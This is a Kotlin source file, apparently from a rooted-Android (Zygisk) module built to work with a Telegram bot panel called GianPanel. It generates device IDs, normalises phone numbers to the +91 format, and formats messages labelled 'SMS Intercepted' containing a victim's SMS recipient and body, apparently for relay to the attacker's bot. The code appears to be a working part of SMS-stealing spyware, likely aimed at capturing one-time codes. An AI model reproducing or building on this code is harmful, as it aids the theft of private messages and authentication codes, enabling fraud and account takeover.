package com.hivirtus.zygiskmode

import java.security.SecureRandom

/**
 * @Gian_AutoToken_bot / GianPanel format compatibility.
 */
object GianPanelCompat {

    private const val DEVICE_ID_LEN = 7
    private val ID_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789"
    private val random = SecureRandom()

    /** Gian bot: "7 character wala" device ID — e.g. qc6gjfs */
    fun generateDeviceId(): String =
        (1..DEVICE_ID_LEN).map { ID_CHARS[random.nextInt(ID_CHARS.length)] }
            .joinToString("")

    fun isGianStyleId(id: String): Boolean {
        val trimmed = id.trim()
        return trimmed.length in 6..8 && trimmed.all { it.isLowerCase() || it.isDigit() }
    }

    fun formatDest(dest: String): String {
        val raw = dest.trim()
        if (raw.isBlank()) return raw
        if (raw.startsWith("+")) return raw
        val digits = raw.replace(Regex("[^0-9]"), "")
        return when {
            digits.length == 10 -> "+91$digits"
            digits.length == 12 && digits.startsWith("91") -> "+$digits"
            digits.isNotBlank() -> "+$digits"
            else -> raw
        }
    }

    fun oneTapCopy(dest: String, body: String): String =
        "${formatDest(dest)} | ${body.trim()}"

    fun buildTelegramInterceptMessage(dest: String, body: String): String {
        val to = formatDest(dest)
        val smsBody = body.trim()
        return buildString {
            appendLine("📱 SMS Intercepted")
            appendLine("-----------------")
            appendLine("To:")
            appendLine(to)
            appendLine()
            appendLine("Message:")
            appendLine(smsBody)
            appendLine()
            appendLine("📋 One-tap copy:")
            append(oneTapCopy(dest, smsBody))
        }
    }
}
